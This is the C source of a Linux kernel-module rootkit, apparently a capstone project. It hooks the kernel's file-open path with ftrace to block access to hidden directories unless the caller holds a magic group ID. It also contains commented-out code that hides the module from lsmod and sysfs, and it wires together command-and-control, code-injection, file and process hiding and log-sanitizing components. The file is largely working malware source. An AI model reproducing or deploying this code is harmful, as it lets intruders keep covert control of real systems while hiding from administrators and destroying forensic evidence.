/*
 * rootkit.c: access blocking, module hiding, init/exit
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/cred.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alice&Bob");
MODULE_DESCRIPTION("Capstone LKM rootkit, access blocking with path protection");

/* Access blocking*/

static unsigned long target_func_addr;
bool blocking_active;

static char *normalize_path(const char *src, char *dst, size_t dlen)
{
  const char *p = src;
  char *out = dst;
  char *end = dst + dlen - 1;
  char *slash_stack[64];
  int sp = 0;

  if (!src || !dst || dlen < 2)
    return NULL;

  if (*p != '/') {
    strncpy(dst, src, dlen - 1);
    dst[dlen - 1] = '\0';
    return dst;
  }

  *out++ = '/';
  slash_stack[sp++] = dst;
  p++;

  while (*p && out < end) {
    if (*p == '/') { p++; continue; }

    if (p[0] == '.' && (p[1] == '/' || p[1] == '\0')) {
      p += 1 + (p[1] == '/');
      continue;
    }

    if (p[0] == '.' && p[1] == '.' && (p[2] == '/' || p[2] == '\0')) {
      p += 2 + (p[2] == '/');
      if (sp > 1) {
        sp--;
        out = slash_stack[sp] + 1;
      } else {
        out = dst + 1;
      }
      continue;
    }

    if (sp < 64)
      slash_stack[sp++] = out - 1;

    while (*p && *p != '/' && out < end)
      *out++ = *p++;
    if (*p == '/') {
      if (out < end) *out++ = '/';
      p++;
    }
  }

  if (out > dst + 1 && *(out - 1) == '/')
    out--;

  *out = '\0';
  return dst;
}

static void notrace blocking_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct ftrace_regs *fregs)
{
  int ret;
  char raw_buf[MAX_PATH_LEN];
  char resolved_buf[MAX_PATH_LEN];
  //struct path resolved_path;
  char *resolved;
  size_t hd1_len = sizeof(HIDDEN_DIR_1) - 1;
  size_t hd2_len = sizeof(HIDDEN_DIR_2) - 1;

  if (!blocking_active) 
    return;

  //user to kernel buffer -> normalize_path (pure string, no sleeping)
  const char __user *filename = (const char __user *)ftrace_regs_get_argument(fregs, 1);

  ret = strncpy_from_user(raw_buf, filename, sizeof(raw_buf));
  if (ret < 0)
    return;

  resolved = normalize_path(raw_buf, resolved_buf, sizeof(resolved_buf));
  if(!resolved)
    resolved = raw_buf;

  // check against /tmp/secret
  if (strncmp(resolved, HIDDEN_DIR_1, hd1_len) == 0){  
    if (resolved[hd1_len] == '\0' || resolved[hd1_len] == '/') {
      if (caller_has_magic_gid() == false) {
        fregs->regs[1] = 0;               //deny access   
        //ftrace_regs_set_argument(fregs, 1, 0)
        pr_info("[rootkit][blocking] blocked access to %s\n", HIDDEN_DIR_1);
      }
    } 
  }

  //check against /dev/shm/secret
  if (strncmp(resolved, HIDDEN_DIR_2, hd2_len) == 0){  
    if (resolved[hd2_len] == '\0' || resolved[hd2_len] == '/') {
      if (caller_has_magic_gid() == false) {
        fregs->regs[1] = 0;               //deny access   
        //ftrace_regs_set_argument(fregs, 1, 0)
        pr_info("[rootkit][blocking] blocked access to %s\n", HIDDEN_DIR_2);
      }
    } 
  }
}


static struct ftrace_ops blocking_ops = {
	.func  = blocking_callback,
	.flags = FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RECURSION,
};


int blocking_init(void)
{
  int ret;

  target_func_addr = kprobe_lookup("do_sys_openat2");
  if (target_func_addr == 0) return -ENOENT;

  ret = ftrace_set_filter_ip(&blocking_ops, target_func_addr, 0, 0);
  if (ret < 0) return ret;

  ret = register_ftrace_function(&blocking_ops);
  if (ret < 0) {
    ftrace_set_filter_ip(&blocking_ops, target_func_addr, 1, 0);
    return ret;
  }

  blocking_active = true;
  return 0;
}

void blocking_exit(void)
{
  unregister_ftrace_function(&blocking_ops);
  ftrace_set_filter_ip(&blocking_ops, target_func_addr, 1, 0);
  
  blocking_active = false;

  pr_info("[rootkit][blocking] ftrace unregistered\n");
}

/* Module self-hiding */

/*
bool module_hidden;
static struct list_head *saved_prev;
//static struct kobject *saved_kobj_parent;

void hide_module(void)
{
  if (module_hidden) {
    pr_warn("[rootkit][WARNING] module already in hidden state\n");
    return;
  }

  //hide from /proc/modules and lsmod
  saved_prev = THIS_MODULE->list.prev;
  list_del_rcu(&THIS_MODULE->list);

  //hide from /sys/module/
  saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
  kobject_get(&THIS_MODULE->mkobj.kobj);
  kobject_del(&THIS_MODULE->mkobj.kobj);

  module_hidden = true;
  pr_info("[rootkit] module hidden\n");
}


void show_module(void)
{
  //int ret;
  if (!module_hidden) {
    pr_warn("[rootkit][WARNING] module not hidden\n");
  }

  //restore to /proc/modules
  list_add_rcu(&THIS_MODULE->list, saved_prev);

  //restore to /sys/module/ (re-add kobject under saved parent)
  ret = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "%s", THIS_MODULE->name);
  if (ret) {
    pr_err("[rootkit][ERROR] kobject_add failed: %d (sysfs entry not restored)\n", ret);
  }
  kobject_put(&THIS_MODULE->mkobj.kobj);

  module_hidden = false;
  pr_info("[rootkit] module restored\n");
}
*/

/* Module init/exit */

static int __init rootkit_init(void)
{
	int ret;
  pr_info("[rootkit] initializing\n");

  ret = c2_init();
  if (ret < 0) {
    return ret;
  }

  ret = inject_init();
  if (ret < 0) {
    goto errorpoint1;
  }

  ret = file_hide_init();
  if (ret < 0) {
    goto errorpoint2;
  }

  ret = proc_hide_init();
  if (ret < 0) {
    goto errorpoint3;
  }

  ret = blocking_init();
  if (ret < 0) {
    goto errorpoint4;
  }

  ret = slink_block_init();
  if (ret < 0) {
    goto errorpoint5;
  }

  ret = log_sanitize_init();
  if (ret < 0) {
    goto errorpoint6;
  }

  pr_info("[rootkit] All modules loaded");
  return 0;

  //goto based error unwinding
errorpoint6:
  slink_block_exit();
errorpoint5:
  blocking_exit();
errorpoint4:
  proc_hide_exit();
errorpoint3:
  file_hide_exit();
errorpoint2:
  inject_exit();
errorpoint1:
  c2_exit();
  
  return ret;
}

static void __exit rootkit_exit(void)
{
  pr_info("[rootkit] cleaning up\n");
	
  //show_module();
  log_sanitize_exit();
  slink_block_exit();
  blocking_exit();
  proc_hide_exit();
  file_hide_exit();
  inject_exit();
  c2_exit();

  pr_info("[rootkit] All modules unloaded");
}

module_init(rootkit_init);
module_exit(rootkit_exit);